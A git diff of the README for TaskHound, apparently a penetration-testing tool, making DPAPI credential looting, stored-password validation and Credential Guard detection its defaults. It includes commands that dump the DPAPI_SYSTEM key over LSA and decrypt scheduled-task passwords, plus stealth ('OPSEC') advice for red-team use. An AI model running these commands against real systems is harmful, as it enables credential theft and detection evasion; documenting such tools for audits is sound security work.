@@ -292,32 +292,39 @@ taskhound -u homer.simpson -p 'Doh!123' -d thesimpsons.local -t moe.thesimpsons.
 
 ## DPAPI Credential Extraction
 
-Extract and decrypt stored task credentials using DPAPI.
+TaskHound extracts and decrypts stored task credentials using DPAPI. **DPAPI looting is enabled by default**.
 
 ```bash
 # Step 1: Get DPAPI_SYSTEM key via LSA dump
 nxc smb moe.thesimpsons.local -u homer.simpson -p 'Doh!123' --lsa
 # Look for: DPAPI_SYSTEM userkey: 0x51e43225...
 
-# Step 2a: Collect + decrypt immediately
-taskhound -t moe.thesimpsons.local -u homer.simpson -p 'Doh!123' -d thesimpsons.local --loot --dpapi-key 0x51e43225...
+# Step 2a: Loot + decrypt immediately (looting is default, just add key)
+taskhound -t moe.thesimpsons.local -u homer.simpson -p 'Doh!123' -d thesimpsons.local --dpapi-key 0x51e43225...
 
-# Step 2b: Or collect now, decrypt later
-taskhound -t moe.thesimpsons.local -u homer.simpson -p 'Doh!123' -d thesimpsons.local --loot --backup ./collected
+# Step 2b: Or collect now (default), decrypt later
+taskhound -t moe.thesimpsons.local -u homer.simpson -p 'Doh!123' -d thesimpsons.local --backup ./collected
 # Later:
 taskhound --offline ./collected/moe.thesimpsons.local --dpapi-key 0x51e43225...
+
+# Disable DPAPI looting explicitly
+taskhound -t moe.thesimpsons.local -u homer.simpson -p 'Doh!123' -d thesimpsons.local --no-loot
 ```
 
-> **Important**: Each host has a unique DPAPI_SYSTEM key. For multi-target scans, collect with `--loot` (no key), then decrypt each target offline.
+> **Important**: Each host has a unique DPAPI_SYSTEM key. For multi-target scans, collect (default), then decrypt each target offline.
 
 ---
 
 ## Credential Validation
 
-TaskHound can verify if stored task passwords are still valid by querying task execution history via RPC.
+TaskHound verifies if stored task passwords are still valid by querying task execution history via RPC. This is **enabled by default**.
 
 ```bash
-taskhound -u homer.simpson -p 'Doh!123' -d thesimpsons.local -t moe.thesimpsons.local --validate-creds
+# Credential validation is on by default, no flag needed
+taskhound -u homer.simpson -p 'Doh!123' -d thesimpsons.local -t moe.thesimpsons.local
+
+# Disable validation explicitly
+taskhound -u homer.simpson -p 'Doh!123' -d thesimpsons.local -t moe.thesimpsons.local --no-validate-creds
 ```
 
 Output includes validation status:
@@ -326,7 +333,7 @@ Output includes validation status:
 - `INVALID` - Logon failure (0x8007052E)
 - `UNKNOWN` - No execution history
 
-> **Note**: Disabled in OPSEC mode due to additional RPC traffic.
+> **Note**: Disabled when using `--opsec` or `--no-rpc`.
 
 ---
 
@@ -437,8 +444,9 @@ TaskHound provides granular control over network operations to balance stealth v
 | LDAP (389/636) | SID resolution, Tier-0 detection, pwdLastSet | `--no-ldap` |
 | Global Catalog (3268) | Cross-domain SID resolution | `--no-ldap` |
 | LSARPC (SMB pipe) | Fallback SID resolution | `--no-rpc` |
-| Remote Registry (SMB pipe) | Credential Guard detection | `--no-rpc` |
-| Task Scheduler RPC (SMB pipe) | Credential validation | `--no-rpc` |
+| Remote Registry (SMB pipe) | Credential Guard detection | `--no-credguard` |
+| Task Scheduler RPC (SMB pipe) | Credential validation | `--no-validate-creds` |
+| DPAPI file collection (SMB) | DPAPI credential blob collection | `--no-loot` |
 
 ### SID Resolution Chain
 
@@ -449,10 +457,22 @@ Default:     BloodHound → Cache → LSARPC → LDAP → GC
 --opsec:     BloodHound → Cache (only)
 ```
 
+### Default Behavior
+
+TaskHound is **very noisy by default** - all features are enabled for maximum visibility. This makes it ideal for audits and comprehensive assessments where OPSEC is not a concern:
+
+- **Credential Guard detection** - Enabled by default (disable with `--no-credguard`)
+- **Credential validation** - Enabled by default (disable with `--no-validate-creds`)
+- **DPAPI looting** - Enabled by default (disable with `--no-loot`)
+- **LDAP resolution** - Enabled by default (disable with `--no-ldap`)
+- **RPC operations** - Enabled by default (disable with `--no-rpc`)
+
+For red team/stealth operations, use `--opsec` to disable all noisy features at once. (Or use the BOF).
+
 ### Usage Examples
 
 ```bash
-# Full OPSEC mode (alias for --no-ldap --no-rpc)
+# Full OPSEC mode (disables: LDAP, RPC, looting, credguard, validation)
 taskhound -u user -p 'pass' -d corp.local -t target --opsec
 
 # Disable LDAP only (keep LSARPC for SID resolution)
@@ -468,7 +488,7 @@ taskhound -u user -p 'pass' -d corp.local --laps --opsec --force-laps
 ### Best Practices for Stealth
 
 1. **Pre-populate BloodHound data** - Import domain data first with `--bh-live`
-2. **Use `--opsec` flag** - Limits resolution to BloodHound + cache only
+2. **Use `--opsec` flag** - Disables all noisy operations at once
 3. **Collect XMLs via other means** - Analyze offline with `--offline`
 4. **Use the BOF implementation** - Available in AdaptixC2
 
@@ -516,14 +536,14 @@ SCANNING OPTIONS
   --offline-disk        Analyze mounted Windows filesystem
   --disk-hostname       Override hostname for offline-disk
   --bh-data             BloodHound export file for HV detection
-  --opsec               Disable noisy operations (alias for --no-ldap --no-rpc)
+  --opsec               Stealth mode: --no-ldap --no-rpc --no-loot --no-credguard --no-validate-creds
   --no-rpc              Disable RPC operations (LSARPC, CredGuard, validation)
   --include-ms          Include \Microsoft tasks
   --include-local       Include local system accounts
   --include-all         Include ALL tasks
   --unsaved-creds       Show tasks without stored credentials
-  --credguard-detect    Detect Credential Guard status
-  --validate-creds      Validate stored credentials via RPC
+  --no-credguard        Disable Credential Guard detection (default: enabled)
+  --no-validate-creds   Disable credential validation (default: enabled)
 
 BLOODHOUND OPTIONS
   --bh-live             Enable live BloodHound connection
@@ -547,7 +567,7 @@ OPENGRAPH OPTIONS (BHCE ONLY)
   --bh-allow-orphans    Create edges for missing nodes
 
 DPAPI OPTIONS
-  --loot                Collect DPAPI credential blobs
+  --no-loot             Disable DPAPI credential collection (default: enabled)
   --dpapi-key           DPAPI_SYSTEM userkey (hex format)
 
 LDAP/SID RESOLUTION
